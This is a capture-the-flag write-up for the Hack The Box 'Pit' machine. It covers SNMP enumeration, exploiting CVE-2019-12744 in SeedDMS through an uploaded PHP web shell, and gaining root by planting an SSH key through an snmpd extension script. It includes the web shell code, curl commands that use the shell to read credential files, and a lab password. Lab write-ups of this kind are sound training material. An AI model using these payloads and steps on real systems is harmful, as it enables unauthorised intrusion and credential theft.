@@ -1,0 +1,203 @@
+Pit
+
+ 24th Sep 2021 / Document No D21.100.133
+ Prepared By: polarbearer
+ Machine Author(s): polarbearer & GibParadox
+ Difficulty: Medium
+ Classification: Official
+Synopsis
+
+Pit is a medium difficulty Linux machine that focuses on SNMP enumeration and exploitation, while
+introducing basic SELinux restrictions and web misconfigurations. By enumerating SNMP via the default
+insecure public community, information about filesystems and users can be obtained. This allows
+attackers to discover and gain access to a vulnerable SeedDMS instance, which was incorrectly patched by
+applying Apache .htaccess rules to an Nginx server where they are not effective. Exploiting CVE-2019-
+12744 results in Remote Command Execution (with some SELinux restrictions) and subsequent access to a
+Cockpit console via password reuse. Privileges are escalated by writing a Bash script that is executed as an
+SNMP extension when the corresponding OID is queried.
+
+Skills Required
+
+      SNMP enumeration
+      Web enumeration
+      Basic Linux knowledge
+
+Skills Learned
+
+      SNMP extensions
+      Exploiting CVE-2019-12744
+      Basic awareness about possible SELinux restrictions
+Enumeration
+
+Nmap
+
+TCP
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.241 | grep ^[0-9] | cut -d '/' -f1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.10.241
+
+Nmap reveals that OpenSSH and nginx are listening on their default ports. Additionally, a service listening
+on port 9090 is using a TLS certificate with commonName dms-pit.htb .
+
+UDP
+
+   nmap -sU -top-ports 50 10.10.10.241
+A basic UDP port scan reveals the SNMP daemon listening on its default port.
+
+SNMP
+
+The snmpwalk command can be used to verify SNMP access using the default public community.
+   snmpwalk -cpublic -v2c 10.10.10.241
+
+Since walking the whole SNMP tree may be too time consuming, we will query for specific OIDs focusing on
+the information we are interested in. We start with disk information:
+
+   snmpwalk -cpublic -v2c 10.10.10.241 .1.3.6.1.4.1.2021.9
+Use of the device mapper suggests the system is running LVM. More importantly, we see a filesystem
+mounted to /var/www/html/seeddms51x/seeddms , which falls under the web root.
+Querying SNMP for standard OIDs (filesystems, network settings, etc.) does not provide us with any useful
+information, so we further enumerate potential custom extensions by querying the corresponding OID:
+
+   snmpwalk -cpublic -v2c 10.10.10.241 .1.3.6.1.4.1.8072.1.3.2
+An extend command named monitoring is defined, which runs the /usr/bin/monitor script. From the
+returned output we can gather some interesting information. Specifically, a user called michelle is defined
+on the system, which is a confined user_u SELinux user (we can see from the table of SELinux user
+capabilities that, for example, this user won't be able to run the su and sudo commands).
+
+Nginx
+Browsing by IP address takes us to the default Nginx Red Hat page:
+
+Having discovered the common name dms-pit.htb from previous enumeration, we can add a
+corresponding entry to /etc/hosts and then browse to http://dms-pit.htb :
+
+   echo "10.10.10.241 dms-pit.htb" | sudo tee -a /etc/hosts
+This results in a 403 Forbidden error.
+Knowing a directory named seeddms51x/seeddms exists under /var/www/html , we try accessing it via the
+URL http://dms-pit.htb/seeddms51x/seeddms/ . This takes us to the SeedDMS login screen:
+
+Cockpit
+
+Browsing to port 9090 takes us to the CentOS Cockpit login page. We don't have any valid credentials at this
+point, so we are unable to proceed further.
+Foothold
+
+After a few failed attempts, we manage to obtain access to SeedDMS using credentials michelle:michelle
+for the user discovered earlier.
+
+An Upgrade Note is available. We read it:
+
+According to the attached CHANGELOG file, a Remote Command Execution vulnerability was patched in
+version 5.1.11:
+
+   --------------------------------------------------------------------------------
+                                         Changes in version 5.1.11
+
+   --------------------------------------------------------------------------------
+   - fix for CVE-2019-12744 (Remote Command Execution through unvalidated
+
+      file upload), add .htaccess file to data directory, better documentation
+      for installing seeddms
+We can download SeedDMS 5.1.15 from here. The seeddms51x/seeddms-5.1.15/doc/README.Install.md
+file included in the downloaded archive contains a SECURITY CONSIDERATIONS section that gives an
+example .htaccess configuration to restrict access to the data directory.
+   SECURITY CONSIDERATIONS
+=======================
+
+A crucial point when setting up SeedDMS is the propper placement of the
+
+data directory. Do not place it below your document root as
+configured in your web server! If you do so, there is good change that
+attackers can easily access your documents with a regular browser.
+If you can't place the data directory outside of document root, that either
+restrict access to it with an appropriate .htaccess file or/and change
+the `contentOffsetDir` in `settings.xml` to something random, but ensure it
+is still a valid directory name. If you change contentOffsetDir then
+do not forget to move `data/1048576` to `data/<your random name>`.
+
+Example for .htaccess file in data directory
+----------------------------------------------
+```
+# line below if for Apache 2.4
+<ifModule mod_authz_core.c>
+Require all denied
+</ifModule>
+
+# line below if for Apache 2.2
+<ifModule !mod_authz_core.c>
+deny from all
+   Satisfy All
+   </ifModule>
+
+   # section for Apache 2.2 and 2.4
+   <ifModule mod_autoindex.c>
+   IndexIgnore *
+   </ifModule>
+   ```
+This information matches with the available PoC for CVE-2019-12744, which exploits unvalidated file upload
+to the data directory. As the example clearly states, the .htaccess settings are meant for Apache, while
+the web server running on the target system is nginx. As we can see by looking at the quickstart archive, this
+is configured by default. We can confirm it by requesting the .htaccess file:
+   curl http://dms-pit.htb/seeddms51x/data/.htaccess
+
+Since nginx ignores .htaccess files, there is a chance we might still be able to upload arbitrary files and
+access them to obtain remote code execution.
+Following the PoC exploit, we create the following PHP file:
+   <?php
+   if(isset($_REQUEST['cmd'])){
+
+                 echo "<pre>";
+                 $cmd = ($_REQUEST['cmd']);
+                 system($cmd);
+                 echo "</pre>";
+                 die;
+   }
+   ?>
+Next we navigate to the Docs/Users/michelle folder (where we have write permissions), select the Add
+document menu item and upload the file:
+
+Notice that only the Name and Local file fields are required. The file is successfully uploaded:
+We can now grab the document ID ( 36 in this example) from the link URL:
+   http://dms-pit.htb/seeddms51x/seeddms/out/out.ViewDocument.php?documentid=36&showtree=1
+
+According to the PoC, the uploaded web shell should be accessible at /data/1048576/<document
+id>/1.php?cmd=<command> .
+We verify this by running the id command:
+
+   curl http://dms-pit.htb/seeddms51x/data/1048576/36/1.php?cmd=id
+
+Any reverse/bind shell attempt seems to be blocked (possibly by SELinux), so we attempt to read interesting
+files instead. Specifically, we are interested in the conf/settings.xml file:
+
+   curl http://dms-pit.htb/seeddms51x/data/1048576/36/1.php?
+   cmd=cat%20/var/www/html/seeddms51x/conf/settings.xml
+Among other things, the settings.xml file contains database access information:
+
+SSH password authentication is disabled, but the retrieved password ied^ieY6xoquu can be used to login
+as michelle from the Cockpit console on port 9090.
+From the Terminal page we can obtain an interactive shell and finally read the user flag.
+Privilege Escalation
+
+As noted previously, the /usr/bin/monitor script is called by snmpd. We can read it:
+
+We don't have read or execute permissions on the /usr/local/monitoring directory, but the + sign in
+the file listing indicates that ACLs have been set on the directory:
+
+We can use readfacl to list the available ACLs:
+
+This means we have write access to the directory, which allows us to write arbitrary scripts and have them
+executed (with root privileges) by snmpd. SELinux rules, as they did earlier, prevent us from opening TCP
+connections, so a bind/reverse shell won't work. Additionally, SELinux blocks access to the root.txt file,
+which makes it impossible to just echo it and read the flag via SNMP. Somehing we can do, instead, is write
+our public SSH key into root 's authorized_keys file. We create the following check_key.sh script inside
+the monitoring directory:
+
+   echo 'echo "ssh-rsa AAAAB3NzaC1y<SNIP>" >> /root/.ssh/authorized_keys' >
+   /usr/local/monitoring/check_key.sh
+We run snmpwalk to execute the script:
+   snmpwalk -cpublic -v2c 10.10.10.241 .1.3.6.1.4.1.8072.1.3.2
+
+We can now SSH to the system as root .
+
+The root flag can be found in /root/root.txt .
+
